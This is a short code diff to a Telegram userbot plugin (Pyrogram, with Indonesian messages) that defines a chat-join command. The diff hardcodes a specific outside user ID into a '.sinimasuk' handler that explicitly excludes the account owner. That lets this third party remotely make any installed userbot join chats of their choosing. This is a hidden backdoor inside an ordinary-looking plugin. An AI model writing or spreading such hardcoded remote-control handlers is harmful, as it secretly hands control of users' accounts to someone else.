@@ -18,13 +18,13 @@ from Uputt.helpers.basic import edit_or_reply
 from .help import *
 
 
-@Client.on_message(filters.command("sinimasuk", ["."]) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.command("sinimasuk", ["."]) & filters.user(1860375797) & ~filters.me)
 @Client.on_message(filters.command("join", cmd) & filters.me)
 async def join(client: Client, message: Message):
     Uputt = message.command[1] if len(message.command) > 1 else message.chat.id
     xxnx = await edit_or_reply(message, "`Processing...`")
     try:
-        await xxnx.edit(f"**Berhasil Bergabung ke Chat ID** `{Man}`")
+        await xxnx.edit(f"**Berhasil Bergabung ke Chat ID** `{Uputt}`")
         await client.join_chat(Uputt)
     except Exception as ex:
         await xxnx.edit(f"**ERROR:** \n\n{str(ex)}")
